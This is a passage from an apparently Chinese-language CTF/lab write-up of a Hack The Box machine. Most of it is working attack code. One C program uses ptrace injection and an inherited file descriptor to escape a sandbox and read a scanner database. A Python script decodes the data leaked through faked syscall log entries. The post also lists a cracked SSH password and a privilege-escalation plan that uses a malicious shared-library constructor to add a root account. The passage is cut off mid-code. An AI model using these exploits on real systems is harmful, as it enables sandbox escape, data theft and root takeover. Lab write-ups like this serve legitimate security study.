class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_stage_1</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">do_stage_2</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">log_data</span><span class="params">(<span class="type">char</span> *data, <span class="type">unsigned</span> <span class="type">long</span> size)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">inject</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">guard</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">putdata</span><span class="params">(<span class="type">pid_t</span> child, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr, <span class="type">char</span> *str, <span class="type">int</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">putdata</span><span class="params">(<span class="type">pid_t</span> child, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr, <span class="type">char</span> *str, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *laddr;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">u</span> &#123;</span></span><br><span class="line">        <span class="type">long</span> val;</span><br><span class="line">        <span class="type">char</span> chars[<span class="keyword">sizeof</span>(<span class="type">long</span>)];</span><br><span class="line">    &#125; data;</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len / <span class="keyword">sizeof</span>(<span class="type">long</span>);</span><br><span class="line">    laddr = str;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, <span class="keyword">sizeof</span>(<span class="type">long</span>));</span><br><span class="line">        <span class="keyword">if</span> (ptrace(PTRACE_POKEDATA, child, (<span class="type">void</span> *)addr + i * <span class="keyword">sizeof</span>(<span class="type">long</span>), data.val) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error poking - %d\n&quot;</span>, errno);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ++i;</span><br><span class="line">        laddr += <span class="keyword">sizeof</span>(<span class="type">long</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    j = len % <span class="keyword">sizeof</span>(<span class="type">long</span>);</span><br><span class="line">    <span class="keyword">if</span> (j != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child, (<span class="type">void</span> *)addr + i * <span class="keyword">sizeof</span>(<span class="type">long</span>), data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_stage_1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> pid = <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Child is %d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_ATTACH, pid, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Attaching&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Attached\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Get regs&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Got regs\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    putdata(pid, regs.rip, (<span class="type">char</span> *)inject, (<span class="type">int</span>)((<span class="type">unsigned</span> <span class="type">long</span>)&amp;guard - (<span class="type">unsigned</span> <span class="type">long</span>)&amp;inject));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Wrote data\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_DETACH, pid, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Detach&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Detached!&quot;</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_stage_2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Stage 2 - currently running in killer&quot;</span>);</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> fd = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> cwd = open(<span class="string">&quot;.&quot;</span>, O_RDONLY | O_DIRECTORY);</span><br><span class="line">    <span class="keyword">if</span> (cwd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Open current directory&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fchdir(fd) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fchdir() = %d\n&quot;</span>, errno);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (chdir(<span class="string">&quot;../../../../../../../../../../&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;chdir() = %d\n&quot;</span>, errno);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> file_fd = open(<span class="string">&quot;./var/www/malscanner/malscanner.db&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (file_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Open malscanner.db&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">200000</span>);</span><br><span class="line">    <span class="keyword">if</span> (!buf) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Memory allocation&quot;</span>);</span><br><span class="line">        close(file_fd);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size = read(file_fd, buf, <span class="number">200000</span>);</span><br><span class="line">    close(file_fd);</span><br><span class="line">    fchdir(cwd);</span><br><span class="line"></span><br><span class="line">    log_data(buf, size);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">inject</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> program[] = <span class="string">&quot;/userprog&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *arg[<span class="number">3</span>] = &#123;program, <span class="string">&quot;2&quot;</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movq $59, %%rax; movq %0, %%rdi; movq %1, %%rsi; xor %%rdx, %%rdx; syscall;&quot;</span></span><br><span class="line">        :</span><br><span class="line">        : <span class="string">&quot;r&quot;</span>(program), <span class="string">&quot;r&quot;</span>(arg)</span><br><span class="line">        : <span class="string">&quot;rax&quot;</span>, <span class="string">&quot;rdi&quot;</span>, <span class="string">&quot;rsi&quot;</span>, <span class="string">&quot;rdx&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">guard</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        do_stage_1();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        do_stage_2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">log_data</span><span class="params">(<span class="type">char</span> *data, <span class="type">unsigned</span> <span class="type">long</span> size)</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;log&quot;</span>, O_WRONLY | O_APPEND, <span class="number">0777</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Open log&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lseek(fd, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="type">int</span> offset = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">8</span> * <span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (offset &lt; size) &#123;</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span> *)buf)[<span class="number">0</span>] = <span class="number">0x1337</span>;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;buf[<span class="number">7</span> * <span class="number">8</span>], &amp;data[offset], <span class="number">8</span>);</span><br><span class="line">        write(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        offset += <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p><code>inject()</code> 是核心邏輯，因為注入環境受限，像是無法預期程式的載入位置或是獲取符號表，所以函式要盡可能的簡單短小，所以可以看到上面直接使用組合語言操作底層資源。<br>注入的目的是讓程式可以重新執行自身，並進一步突破沙盒限制，重新執行的時候會戴上兩個關鍵改變：</p>
+<ul>
+<li>傳遞參數 2 來觸發 <code>do_stage_2()</code></li>
+<li>此時程式已經持有一個沙盒外部的 File Descriptor<br>第二階段處理：</li>
+<li>沙盒本身限制了網路訪問，所以不能過通過常規的方式，如 http 請求來傳輸資料。</li>
+<li>而唯一能從沙盒中輸出訊息的方式是 log，在 <code>training.c</code> 中日誌的格式被明確定義，這成為資料外洩的入口，在 <code>training.c</code> 中，我們可以看到下面的格式：<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((__<span class="title">packed__</span>)) &#123;</span></span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> ret;</span><br><span class="line">&#125; registers;</span><br></pre></td></tr></table></figure></div>
+我們可以偽造系統調用編號 0x1337，因為這個編號遠超過系統調用的合法範圍，避免和真實的調用衝突。<br>然後我們透過日誌系統調用的 ret 來將要外洩的資料分塊處理，每次寫入 8 個字節。<br>那為了避免發生 race condition 同時紀錄其他系統調用到日誌系統，所以我們可以讓原始進程進入睡眠，避免其他系統調用干擾。<br>我們可以使用 musl-gcc 編譯來確保跨平台執行。<br>上傳之後如果我們看到 ignored 有一堆帶著 4919 的 syscalls，就代表我們的惡意程式被成功執行，接著我們就可以嘗試寫一個 python 腳本來幫我們反轉 <code>log_data</code> 的邏輯：<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">f&quot;Usage: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> &lt;url&gt;&quot;</span>)</span><br><span class="line"> exit(-<span class="number">1</span>)</span><br><span class="line">r = requests.get(sys.argv[<span class="number">1</span>])</span><br><span class="line">calls = re.findall(<span class="string">r&quot;sys_4919\(\) = 0x([a-f0-9]+)&quot;</span>, r.text, re.MULTILINE)</span><br><span class="line">exfil = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> val <span class="keyword">in</span> calls:</span><br><span class="line"> exfil += struct.pack(<span class="string">&quot;Q&quot;</span>, <span class="built_in">int</span>(val, <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(exfil.decode())</span><br></pre></td></tr></table></figure></div>
+然後我們可以執行來看 leak 的資料：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌─[sg-dedivip-1]─[10.10.14.22]─[kazma@htb-5fjpirbhiq]─[~/Downloads/sandbox]</span><br><span class="line">└──╼ [★]$ python3 help.py http://10.129.237.62/viewer/012404b2081624a252957a599dd1a10c/; <span class="built_in">cat</span> out </span><br></pre></td></tr></table></figure></div>
+接著拿到 hash 之後換成正確的格式用 hashcat 爆破，拿到密碼 <code>onedayyoufeellikecrying</code>，有了可能得 ssh 密碼後我們可以重複剛剛的操作去撈 <code>/etc/passwd</code> 來找尋可能對應的 username，我們可以發現有個 user clarence，ssh 上去之後就可以在家目錄拿到 user flag 了！</li>
+</ul>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>接下來我們要講一下 chroot，他的作用是將系統對絕對路徑以 &#x2F; 開頭的路徑的解析限制到指令的根目錄下，通常是用在沙盒化，讓程式只能訪問被隔離的檔案。而只有 root 可以執行 chroot，因為它會改變應用程式對檔案系統的看法，如果非 root 使用者能夠使用可能會有題權危險。<br>那我們的攻擊思路如下：</p>
+<ul>
+<li>首先我們先創建一個惡意的 library 命名成 <code>/lib/libc.so.6</code> 包含帶有 constructor 的程式碼，利用腳本把必要的檔案包含這個惡意的 library 複製到 &#x2F;lib 中的目錄。</li>
+<li>程式在執行後會注入到 killer 中</li>
+<li>使用 fchdir 進行 sandbox escape </li>
+<li>就能夠到外面執行 &#x2F;bin&#x2F;su，如此 su 就會加載到剛剛的惡意 library 讓我們拿到 root 權限</li>
+</ul>
+<p>那在開始前，我們可以先看 <code>/bin/su</code> 正常在執行時會 load 的 libraries：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">clarence@scanned:~$ ldd /bin/su</span><br><span class="line">	linux-vdso.so.1 (0x00007ffed15f3000)</span><br><span class="line">	libpam.so.0 =&gt; /lib/x86_64-linux-gnu/libpam.so.0 (0x00007f9bdc63a000)</span><br><span class="line">	libpam_misc.so.0 =&gt; /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007f9bdc635000)</span><br><span class="line">	libutil.so.1 =&gt; /lib/x86_64-linux-gnu/libutil.so.1 (0x00007f9bdc630000)</span><br><span class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9bdc46b000)</span><br><span class="line">	libaudit.so.1 =&gt; /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007f9bdc43a000)</span><br><span class="line">	libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f9bdc434000)</span><br><span class="line">	/lib64/ld-linux-x86-64.so.2 (0x00007f9bdc666000)</span><br><span class="line">	libcap-ng.so.0 =&gt; /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007f9bdc42a000)</span><br><span class="line">	libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f9bdc408000)</span><br></pre></td></tr></table></figure></div>
+<p>其中可以看到 <code>libpam_misc.so.0</code> 是一個和 PAM（Pluggable Authentication Module）相關的共享庫，通常被身份驗證相關的應用程序加載，在這邊就很適合作為我們覆蓋的目標。<br>我們的目標是在系統中創建一個新用戶 root2，並賦予其 root 權限，做法是通過在 <code>/etc/passwd</code> 下面的內容：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root2:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure></div>
+<p>接著我們把新的 exploit：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_stage_1</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">do_stage_2</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">log_data</span><span class="params">(<span class="type">char</span>* data, <span class="type">unsigned</span> <span class="type">long</span> size)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">inject</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">guard</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">putdata</span><span class="params">(<span class="type">pid_t</span> child, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr, <span class="type">char</span>* str, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">char</span>* laddr;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">u</span> &#123;</span></span><br><span class="line">        <span class="type">long</span> val;</span><br><span class="line">        <span class="type">char</span> chars[<span class="keyword">sizeof</span>(<span class="type">int</span>)];</span><br><span class="line">    &#125; data;</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len / <span class="keyword">sizeof</span>(<span class="type">int</span>);</span><br><span class="line">    laddr = str;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        <span class="keyword">if</span> (ptrace(PTRACE_POKEDATA, child, (<span class="type">void</span>*)addr + i * <span class="keyword">sizeof</span>(<span class="type">int</span>), data.val) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error poking - %d\n&quot;</span>, errno);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ++i;</span><br><span class="line">        laddr += <span class="keyword">sizeof</span>(<span class="type">int</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    j = len % <span class="keyword">sizeof</span>(<span class="type">int</span>);</span><br><span class="line">    <span class="keyword">if</span> (j != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child, (<span class="type">void</span>*)addr + i * <span class="keyword">sizeof</span>(<span class="type">int</span>), data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_stage_1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> pid = <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Child is %d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_ATTACH, pid, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Attaching&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Attached\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Get regs&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Got regs\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    putdata(pid, regs.rip, (<span class="type">char</span>*)inject, (<span class="type">int</span>)(&amp;guard - &amp;inject));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Wrote data\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_DETACH, pid, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Detach&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Detached!&quot;</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_stage_2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span 